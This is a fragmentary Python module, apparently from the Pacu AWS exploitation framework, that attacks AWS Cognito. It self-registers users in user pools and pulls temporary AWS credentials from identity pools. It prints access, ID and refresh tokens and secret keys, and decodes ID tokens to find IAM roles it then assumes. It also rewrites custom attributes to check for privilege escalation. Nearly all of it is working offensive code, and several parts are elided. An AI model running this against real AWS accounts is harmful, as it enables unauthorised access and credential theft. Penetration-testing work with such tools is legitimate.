...
parser.add_argument('--email', required=False, default=False, action='store', help='Email address to receive verification code (not always needed; this is sometimes sent to username).')
parser.add_argument('--regions', required=False, default=None, help='Region(s) to target. Defaults to region(s) indicated in other arguments, and to Pacu Cognito database regions if none is found. Standard format (e.g. us-west-2).')
parser.add_argument('--user_pools', required=False, default=False, action='store', help='User pool(s) to target. This will attempt to list their user pool clients and target them also. Defaults to user pools indicated in user pool clients argument, and to all session user pools if none is found. Standard format of REGION_GUID (e.g. us-west-2_uS2erhWzQ).')
parser.add_argument('--user_pool_clients', required=False, default=False, action='store', help='User pool client(s) to target. Defaults to all session user pool clients. Format: ClientID@UserPoolID (e.g. 1june8@us-west-2_uS2erhWzQ.')
parser.add_argument('--identity_pools', required=False, default=False, action='store', help='Identity pool(s) to target. Defaults to all session identity pools. Standard format of \'REGION:GUID\' and requires the single quotes due to colon (e.g. \'us-east-1:7dbbvc22-b905-4d75-9b2a-54ade5132076\').')
parser.add_argument('--username', required=False, default=False, action='store', help='Username for sign-up or verify. Defaults to testuser.')
parser.add_argument('--password', required=False, default=False, action='store', help='Password for sign-up or verify. Defaults to TesPas808@!.')
...
def main(args, pacu_main):
    ...
    if not args.user_pools and not args.user_pool_clients and not args.identity_pools:
        if not args.regions:
            ...
            if regions is None or regions == [] or regions == '' or regions == {}:
                print('This module is not supported in any regions specified in the current session\'s region set. Exiting...')
                return
            else:
        ...
        print('No user pools, user pool clients, or identity pools specified. Using all user pool clients in Pacu session database.')
        if fetch_data(['Cognito', 'UserPools'], module_info['prerequisite_modules'][0], f"--regions {','.join(regions)}") is False:
            print('Pre-req module failed, exiting...')
            return
        if fetch_data(['Cognito', 'UserPoolClients'], module_info['prerequisite_modules'][0], f"--regions {','.join(regions)}") is False:
            print('Pre-req module failed, exiting...')
            return
        if fetch_data(['Cognito', 'IdentityPools'], module_info['prerequisite_modules'][0], f"--regions {','.join(regions)}") is False:
            print('Pre-req module failed, exiting...')
            return
        up_clients = [client for client in session.Cognito['UserPoolClients'] if client['Region'] in regions]
    ...
    if args.identity_pools:
        ...
        for identity_pool in args.identity_pools.split(','):
            ...
            try:
                ...
                identity_creds = identity_client.get_credentials_for_identity(IdentityId=identity_id['IdentityId'])
                if identity_creds['Credentials']['AccessKeyId'] is not None:
                    ...
                    new_identity_pool['AccessKeyId'] = identity_creds['Credentials']['AccessKeyId']
                if identity_creds['Credentials']['SecretKey'] is not None:
                    print('Secret Key found.')
                    new_identity_pool['SecretKey'] = identity_creds['Credentials']['SecretKey']
                ...
                if identity_creds['Credentials']['SessionToken'] is not None:
                    ...
                    new_identity_pool['SessionToken'] = identity_creds['Credentials']['SessionToken']
                    print(identity_creds['Credentials']['SessionToken'])
                if identity_creds['Credentials']['Expiration'] is not None:
                    print('Expiration found.')
                    new_identity_pool['Expiration'] = identity_creds['Credentials']['Expiration']
        ...
        for user_pool in args.user_pools.split(','):
                    ...
                    while (response is None or next_token is not None):
                        if next_token is None:
                            try:
                                print(f"Trying to list original user pool clients for UserPoolId: {user_pool} in region {region}")
                            ...
                            try:
                                print(f"Trying to list else-block user pool clients for UserPoolId: {user_pool}")
                                response = client.list_user_pool_clients(
                    ...
                    print(f'  {len(up_clients)} user pool client(s) found in user pool {user_pool}.')

    if args.user_pool_clients:
        for up_client in args.user_pool_clients.split(','):
            if "@" not in up_client:
                print('ERROR: User pool client names must be in the format "ClientID@UserPoolID" (e.g. 1june8@us-west-2_uS2erhWzQ).')
    ...
    for up_client in up_clients:
        print('Attempting to sign up user in user pool client ' + up_client['ClientId'] + ' in region ' + up_client['Region'] + ' . . . ')
        attack_user = {}
        attack_user['Tokens'] = {}
        ...
        identity_client = pacu_main.get_boto3_client('cognito-identity', up_client['Region'])
        response = sign_up(client, args.email, up_client['ClientId'], args.username, args.password)
        if response is True or 'exists' in str(response):
            if response is True:
                tokens = verify(client, args.username, up_client['ClientId'], up_client['UserPoolId'], up_client['Region'])
                all_new_regions.append(up_client['Region'])
            elif 'exists' in str(response):
                print('User exists')
            try:
                aws = AWSSRP(username=args.username, password=args.password, pool_id=up_client['UserPoolId'], client_id=up_client['ClientId'], client=client)
                tokens = aws.authenticate_user()
                if 'AuthenticationResult' in tokens:
                    print("You're signed in as " + args.username + "!")
                    print("Your access token is: " + tokens['AuthenticationResult']['AccessToken'])
                    print("Your ID token is: " + tokens['AuthenticationResult']['IdToken'])
                    print("Your refresh token is: " + tokens['AuthenticationResult']['RefreshToken'])
                    ...
                    attack_user['Tokens']['AccessToken'] = tokens['AuthenticationResult']['AccessToken']
                    attack_user['Tokens']['IdToken'] = tokens['AuthenticationResult']['IdToken']
                    attack_user['Tokens']['RefreshToken'] = tokens['AuthenticationResult']['RefreshToken']
                    attack_user['Tokens']['TokenType'] = tokens['AuthenticationResult']['TokenType']
                    credentials = get_identity_credentials(cognito_identity_pools, identity_client, tokens['AuthenticationResult']['IdToken'], up_client['UserPoolId'], up_client['Region'])
                    ...
                    new_tokens, new_credentials = get_custom_attributes(client, tokens, args.password, up_client['Region'], up_client['ClientId'], up_client['UserPoolId'], cognito_identity_pools, identity_client)
                    ...
                    attack_user['NewRoleTokens'] = prompt_assume_roles(client, roles)
                    if attack_user['NewRoleTokens'] is not None:
                        print('New role tokens retrieved! Attempting to receive temporary credentials from identity pool.')
                        new_role_credentials = get_identity_credentials(cognito_identity_pools, identity_client, attack_user['NewRoleTokens']['IdToken'], up_client['UserPoolId'], up_client['Region'])
                ...
                tokens = aws.respond_to_software_token_mfa_challenge(code)
            if tokens['ChallengeName'] == 'MFA_SETUP':
                try:
                    print(tokens)
                    print("First, we need to set up an MFA application.")
                    associate_token_response = client.associate_software_token(Session=tokens['Session'])
                    qr_img = qrcode.make(
                        f"otpauth://totp/{args.username}?secret={associate_token_response['SecretCode']}")
                    qr_img.save("qr.png")
                    print("A QR code has been generated for you. Please scan it with your MFA application.")
                    try:
                        webbrowser.open("qr.png")
                    except:
                        print("Something went wrong when opening the file. Note that this cannot be done as root. Please manually open qr.png in the working directory to scan the QR code.")
                        continue

                    mfa_code = input("Please enter the MFA code generated by your application: ")
                    verify_software_token_response = client.verify_software_token(
                        Session=associate_token_response['Session'],
                        UserCode=mfa_code
                    )                 
                    ...
                    try:
                        aws2 = AWSSRP(username=args.username, password=args.password, pool_id=up_client['UserPoolId'], client_id=up_client['ClientId'], client=client)
                        print('Entering aws2_response area')
    ...
    if regions != []:
        ...
        if fetch_data(['Cognito', 'NewUsers'], module_info['prerequisite_modules'][0], f"--regions {','.join(regions)}") is False:
    ...
    if choice.lower() == 'y':
        for user in session.Cognito['UsersInPools']:
            if any(search_string in attribute['Name'] for attribute in user['Attributes']):
...
def sign_up(client, email, client_id, username, password, user_attributes=None):
        ...
        try:
            ...
            if 'attribute is required' in error_message:
                parameter = re.search(r"schema: (.*?): The attribute is required", error_message)
                if parameter:
                    ...
                    param_value = input('Please enter the value of the required attribute: ')
                    user_attributes.append({
                    'Name': param_name,
                    'Value': param_value
                })
                ...
                if param_name == 'Username' or 'username':
                    return sign_up(client, email, client_id, param_value, password, user_attributes)
                if param_name == 'Password' or 'password':
                    return sign_up(client, email, client_id, username, param_value, user_attributes)
                user_attributes.append({
                'Name': param_name,
                'Value': param_value
            })
...
def verify(client, username, client_id, user_pool_id, region):
    new_users = []
    prompt = f'Enter verification code for user {username} in user pool client {client_id}: '
    code = input(prompt)
    try:
...
def get_assumable_roles(id_token):
    ...
    id_token_payload_decoded = str(base64.b64decode(id_token_payload + "=="), "utf-8")
    roles = re.findall(r'arn:aws:iam::\d{12}:role/[\w+=,.@-]+', id_token_payload_decoded)
    print('This user can assume the following roles:' + str(roles))
    return roles

def prompt_assume_roles(client, roles):
    ...
    try:
        ...
        if 0 <= index < len(roles):
            new_role = client.assume_role(
                RoleArn=roles[index],
                RoleSessionName='PacuAssumeRole'
            )
            print('Assumed role successfully.')
            print('Your new credentials are:')
            print(f'AccessKeyId: {client.access_key}')
            print(f'SecretKey: {client.secret_key}')
            print(f'SessionToken: {client.session_token}')
            return new_role
        else:
...
def get_custom_attributes(client, tokens, att_password, newregion, att_clientId, att_userPoolId, cognito_identity_pools, identity_client):
    currentuser = client.get_user(
                        AccessToken=tokens['AuthenticationResult']['AccessToken']
                    )
    search_string = 'custom'
    if any(search_string in attribute['Name'] for attribute in currentuser['UserAttributes']):
        print('Custom attribute(s) found!')
        print(currentuser['UserAttributes'])
        prompt = f'Enter custom attribute name to modify for user' + currentuser['Username']  + ' or hit enter to skip: '
        attribute_name = input(prompt)
        prompt = f'Enter custom attribute value to set for user' + currentuser['Username']  + ' or hit enter to skip: '
        ...
        if attribute_name != '' and attribute_value != '':
            ...
            print('Custom attribute updated!')
        else:
            print('Custom attribute not updated.')
            return None, None
    else:
        print('No custom attributes found.')
        return None, None
    prompt = f'Authenticate again as user' + currentuser['Username']  + ' to check for privesc? (Y/N): '
    choice = input(prompt)
    if choice.lower() == 'y':
        try:
            aws2 = AWSSRP(username=currentuser['Username'], password=att_password, client_id=att_clientId, pool_id=att_userPoolId, client=client)
            print('Entering aws2_response area')
            tokens = aws2.authenticate_user()
            ...
            print("Your refresh token is: " + tokens['AuthenticationResult']['RefreshToken'])
            print("Your token type is: " + tokens['AuthenticationResult']['TokenType'])
            credentials = get_identity_credentials(cognito_identity_pools, identity_client, tokens['AuthenticationResult']['IdToken'], att_userPoolId, newregion)
            if credentials is not False:
                print('Temporary credentials retrieved!')
                print(credentials)
            roles = get_assumable_roles(tokens['AuthenticationResult']['IdToken'])
            prompt_assume_roles(client, roles)
            prompt = 'Modify more custom attributes?'
            choice = input(prompt)
            if choice.lower() == 'y':
                get_custom_attributes(client, tokens, att_password, newregion, att_clientId, att_userPoolId, cognito_identity_pools, identity_client)
            else:
                print('Exiting...')
...
def get_identity_credentials(cognito_identity_pools, identity_client, id_token=None, user_pool_id=None, region=None):
        ...
        if identity_pool['Region'] == region:
            try:
                if id_token is None:
                    ...
                    identity_id = identity_client.get_id(IdentityPoolId=identity_pool['IdentityPoolId'])
                ...
                if id_token is not None:
                    ...
                    identity_id = identity_client.get_id(IdentityPoolId=identity_pool['IdentityPoolId'], Logins=logins)
                    print(f'Identity ID: {identity_id}')
            except ClientError as error:
                print('FAILURE: ')
                code = error.response['Error']['Code']
            ...
            if id_token is not None:
                try:
                    ...
                    identity_creds = identity_client.get_credentials_for_identity(IdentityId=identity_id['IdentityId'], Logins=logins)   
            ...
            if identity_creds['Credentials']['AccessKeyId'] is not None:
                print('Access Key ID found.')
                identity_pool['AccessKeyId'] = identity_creds['Credentials']['AccessKeyId']
            ...
            if identity_creds['Credentials']['SessionToken'] is not None:
                print('Session Token found.')
                identity_pool['SessionToken'] = identity_creds['Credentials']['SessionToken']
                print(identity_pool['SessionToken'])
            if identity_creds['Credentials']['Expiration'] is not None:
                print('Expiration found.')
                identity_pool['Expiration'] = identity_creds['Credentials']['Expiration']
